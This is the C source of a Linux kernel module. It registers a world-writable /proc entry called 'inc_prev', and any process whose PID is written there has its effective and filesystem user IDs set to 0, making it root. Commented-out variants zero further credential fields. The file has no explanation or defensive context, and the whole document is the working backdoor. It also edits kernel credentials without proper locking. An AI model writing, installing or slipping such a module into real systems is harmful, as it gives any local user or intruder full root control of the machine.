#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>

#define PFP "inc_prev"

uint32_t pid;
struct task_struct *task;
struct cred *cred;

void inc_prev(void) {
 	for_each_process(task)
    	if(task->pid == pid) {
            /*cred = (struct cred *)__task_cred(task);*/
            cred = (struct cred *) rcu_dereference(task->cred);
            printk(KERN_INFO "changing %d - %s ; uid %d\n", task->pid, task->comm, task->real_cred->uid.val);
            /*cred->uid.val = 0;
            cred->gid.val =0;
            cred->suid.val = 0;
            cred->sgid.val = 0;*/
            cred->euid.val = 0;
            /*cred->egid.val = 0;*/
            cred->fsuid.val = 0;
            /*cred->fsgid.val = 0;*/
        
            printk(KERN_INFO "uids %d -- %d \n", task->real_cred->uid.val, cred->uid.val);
            printk(KERN_WARNING "pid %d , %s is now root\n", task->pid, task->comm);
		}
}

/*void inc_prev(void) {
    struct task_struct *task = NULL;

    rcu_read_lock();
    
    task = find_task_by_vpid(pid);
    if (task == NULL) {
	    printk(KERN_ALERT "invalid pid");
        rcu_read_unlock();
        return;
    }

    task->cred->euid.val = 0;
    printk(KERN_ALERT "privileges increased");

    rcu_read_unlock();
}*/

static ssize_t write_proc(struct file *filp, const char *buf, size_t count, loff_t *offp) {
	copy_from_user((char *)&pid, buf, sizeof(uint32_t));
	printk(KERN_ALERT "Recv pid from user: %d \n", pid);
  
    inc_prev();

    return sizeof(uint32_t);
}

struct file_operations proc_fops = {
	.write = write_proc
};

int init_module(void)
{
	proc_create(PFP, 0777, NULL, &proc_fops);

	return 0;
}

void cleanup_module(void) {
	remove_proc_entry(PFP, NULL);
}

MODULE_LICENSE("GPL");
MODULE_LICENSE("GPL v2");
